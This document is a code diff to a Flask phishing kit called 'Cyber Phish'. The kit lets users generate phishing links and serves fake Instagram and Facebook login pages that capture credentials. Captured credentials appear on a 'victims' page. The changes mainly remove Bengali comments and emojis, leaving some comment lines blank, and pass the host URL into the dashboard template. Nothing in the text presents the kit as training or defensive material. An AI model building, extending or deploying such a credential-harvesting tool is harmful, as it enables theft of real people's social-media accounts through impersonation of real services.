@@ -9,7 +9,7 @@ app.secret_key = 'your-secret-key-change-this'
 
 DB_NAME = 'phish_data.db'
 
-# ----------------- ডাটাবেস -----------------
+# -----------------  -----------------
 def init_db():
     conn = sqlite3.connect(DB_NAME)
     c = conn.cursor()
@@ -40,7 +40,7 @@ def init_db():
 
 init_db()
 
-# ----------------- স্টাইল -----------------
+# -----------------  -----------------
 BASE_STYLE = """
 <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -161,7 +161,7 @@ BASE_STYLE = """
 </style>
 """
 
-# ----------------- HTML টেমপ্লেট (normal strings) -----------------
+# ----------------- HTML  (placeholders: {BASE_STYLE}  jinja2 ) -----------------
 REGISTER_HTML = """
 <!DOCTYPE html>
 <html>
@@ -169,7 +169,7 @@ REGISTER_HTML = """
 <body>
 <div class="container">
     <div class="glass-card" style="max-width: 450px; margin: auto;">
-        <div class="brand">🔐 CYBER PHISH</div>
+        <div class="brand"> CYBER PHISH</div>
         <h2>Register</h2>
         <form method="post">
             <input type="text" name="username" placeholder="Username" required>
@@ -192,7 +192,7 @@ LOGIN_HTML = """
 <body>
 <div class="container">
     <div class="glass-card" style="max-width: 450px; margin: auto;">
-        <div class="brand">🔐 CYBER PHISH</div>
+        <div class="brand"> CYBER PHISH</div>
         <h2>Login</h2>
         <form method="post">
             <input type="text" name="username" placeholder="Username" required>
@@ -214,21 +214,21 @@ DASHBOARD_HTML = """
 <head><title>Cyber Phish - Dashboard</title>{BASE_STYLE}</head>
 <body>
 <div class="container">
-    <div class="logout"><a href="/logout">🚪 Logout</a></div>
+    <div class="logout"><a href="/logout"> Logout</a></div>
     <div class="glass-card">
-        <div class="brand">🔐 CYBER PHISH</div>
+        <div class="brand"> CYBER PHISH</div>
         <div class="flex-between">
             <h2>Dashboard, {{ user }}</h2>
-            <a href="/create_link" class="btn-small">➕ New Link</a>
+            <a href="/create_link" class="btn-small"> New Link</a>
         </div>
         <h3>Your Phishing Links</h3>
         {% for link in links %}
         <div class="link-card">
             <span class="badge">{{ link.template.upper() }}</span>
-            <code style="word-break: break-all;">{{ request.host_url }}f/{{ link.link_id }}</code>
+            <code style="word-break: break-all;">{{ host_url }}f/{{ link.link_id }}</code>
             <div class="flex-between" style="margin-top: 10px;">
                 <small>Created: {{ link.created_at }}</small>
-                <a href="/victims/{{ link.link_id }}">👁️ View Victims</a>
+                <a href="/victims/{{ link.link_id }}"> View Victims</a>
             </div>
         </div>
         {% else %}
@@ -247,7 +247,7 @@ CREATE_LINK_HTML = """
 <body>
 <div class="container">
     <div class="glass-card" style="max-width: 500px; margin: auto;">
-        <div class="brand">🔐 CYBER PHISH</div>
+        <div class="brand"> CYBER PHISH</div>
         <h2>Generate New Link</h2>
         <form method="post">
             <select name="template" required>
@@ -257,7 +257,7 @@ CREATE_LINK_HTML = """
             <button type="submit">Generate</button>
         </form>
         <div style="text-align: center; margin-top: 20px;">
-            <a href="/dashboard">⬅ Back</a>
+            <a href="/dashboard"> Back</a>
         </div>
     </div>
 </div>
@@ -272,7 +272,7 @@ INSTAGRAM_PAGE = """
 <body>
 <div class="container">
     <div class="glass-card" style="max-width: 450px; margin: auto;">
-        <div class="brand">🔐 CYBER PHISH</div>
+        <div class="brand"> CYBER PHISH</div>
         <h2 style="text-align:center;">Instagram Login</h2>
         <form method="post">
             <input type="text" name="username" placeholder="Phone number, username, or email" required>
@@ -292,7 +292,7 @@ FACEBOOK_PAGE = """
 <body>
 <div class="container">
     <div class="glass-card" style="max-width: 450px; margin: auto;">
-        <div class="brand">🔐 CYBER PHISH</div>
+        <div class="brand"> CYBER PHISH</div>
         <h2 style="text-align:center;">Facebook Login</h2>
         <form method="post">
             <input type="text" name="username" placeholder="Email or Phone" required>
@@ -312,10 +312,10 @@ VICTIMS_HTML = """
 <body>
 <div class="container">
     <div class="glass-card">
-        <div class="brand">🔐 CYBER PHISH</div>
+        <div class="brand"> CYBER PHISH</div>
         <div class="flex-between">
             <h2>Captured Data</h2>
-            <a href="/dashboard" class="btn-small">⬅ Back</a>
+            <a href="/dashboard" class="btn-small"> Back</a>
         </div>
         <p><strong>Link ID:</strong> <code>{{ link_id }}</code></p>
         <div style="overflow-x: auto;">
@@ -330,7 +330,7 @@ VICTIMS_HTML = """
                     <td>{{ v.submitted_at }}</td>
                 </tr>
                 {% else %}
-                <tr><td colspan="4" style="text-align:center;">No victims yet. Share your link first.</td></tr>
+                <tr><td colspan="4" style="text-align:center;">No victims yet. Share your link first.</td></tr>
                 {% endfor %}
             </tbody>
         </table>
@@ -341,12 +341,12 @@ VICTIMS_HTML = """
 </html>
 """
 
-# ----------------- হেল্পার ফাংশন: render with BASE_STYLE -----------------
+# ----------------- :   -----------------
 def render_with_style(template, **context):
     html = template.format(BASE_STYLE=BASE_STYLE)
     return render_template_string(html, **context)
 
-# ----------------- রাউট -----------------
+# -----------------  -----------------
 @app.route('/')
 def home():
     if 'user_id' in session:
@@ -402,7 +402,8 @@ def dashboard():
     c.execute("SELECT link_id, template, created_at FROM links WHERE user_id=?", (session['user_id'],))
     links = [{'link_id': row[0], 'template': row[1], 'created_at': row[2]} for row in c.fetchall()]
     conn.close()
-    return render_with_style(DASHBOARD_HTML, user=session['username'], links=links)
+    host_url = request.host_url  #      
+    return render_with_style(DASHBOARD_HTML, user=session['username'], links=links, host_url=host_url)
 
 @app.route('/create_link', methods=['GET', 'POST'])
 def create_link():
